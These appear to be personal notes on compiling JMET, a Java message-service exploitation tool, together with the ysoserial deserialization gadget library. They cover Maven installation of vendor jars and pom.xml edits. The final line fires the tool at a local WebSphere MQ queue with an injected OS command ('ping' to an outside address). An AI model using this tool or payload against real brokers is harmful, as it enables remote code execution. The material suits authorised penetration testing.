# Notes on how to compile JMET:
git clone https://github.com/matthiaskaiser/jmet

To build JMET:
This URL was a reference:  http://stackoverflow.com/questions/2229757/maven-add-a-dependency-to-a-jar-by-relative-path/2230464#2230464
Get the swift libraries:  http://www.swiftmq.com/downloads/index.html 
	(Create a free account and download a demo copy of the client; files are in swiftmq_10_1_1_client/jars)
Put swiftmq.jar, amqp.jar, and jms.jar into jmet/brokers directory.  jmet is the root of the .git download.

Get the IBM library:  https://www-945.ibm.com/support/fixcentral/swg/downloadFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0&platform=All&function=fixId&fixids=9.0.0.0-IBM-MQ-Install-Java-All&includeRequisites=1&includeSupersedes=0&downloadMethod=http
	(Create a free account to download)
Extract the jar file (using unzip) and put the com.ibm.mq.allclient.jar file in the jmet/brokers directory. jmet is the root of the .git download.

mkdir /home/<USERNAME>/maven
mkdir /home/<USERNAME>/maven/file_repo

mvn install:install-file -Dfile=brokers/swiftmq.jar -DgroupId=com.swiftmq -DartifactId=swiftmq -Dversion=10.1.1 -Dpackaging=jar -DlocalRepositoryPath=/home/<USERNAME>/maven/file_repo
mvn install:install-file -Dfile=brokers/amqp.jar -DgroupId=com.swiftmq -DartifactId=swiftmq-amqp -Dversion=10.1.1 -Dpackaging=jar -DlocalRepositoryPath=/home/<USERNAME>/maven/file_repo
mvn install:install-file -Dfile=brokers/jms.jar -DgroupId=com.swiftmq -DartifactId=swiftmq-jms -Dversion=10.1.1 -Dpackaging=jar -DlocalRepositoryPath=/home/<USERNAME>/maven/file_repo
mvn install:install-file -Dfile=brokers/com.ibm.mq.allclient.jar -DgroupId=com.ibm -DartifactId=com.ibm.mqjms-all -Dversion=9 -Dpackaging=jar -DlocalRepositoryPath=/home/<USERNAME>/maven/file_repo

 - Edit the pom.xml file:
—move the four <dependency> entries within the “commercial” profile to the main dependencies section
—remove the “commercial” profile completely.
— add a reference to the local file repo below the <build> section

<repositories>
  <repository>
    <id>maven-local-repo</id>
    <url>file://./home/<USERNAME>/maven/file_repo</url>
  </repository>
</repositories>

in the pom.xml add the following dependency:
        <dependency>
            <groupId>org.apache.activemq</groupId>
            <artifactId>activemq-openwire-legacy</artifactId>
            <version>5.12.3</version>
        </dependency>


cd jmet (root folder with JMET.iml and pom.xml)
mkdir ysoserial
cd ysoserial
Download the latest jar from the link at this URL:  https://github.com/frohoff/ysoserial
mvn install:install-file -Dfile=ysoserial/ysoserial-master-SNAPSHOT.jar -DgroupId=ysoserial -DartifactId=ysoserial -Dversion=0.0.4-MASTER -Dpackaging=jar -DlocalRepositoryPath=/home/<USERNAME>/maven/file_repo

Update the ysoserial dependency in the pom.xml file to match the version in the previous command.



mvn clean compile assembly:single



java -jar jmet-0.1.0-all.jar -Q event -I WebSphereMQ -Y "ping 128.147.213.141" 127.0.0.1 1414
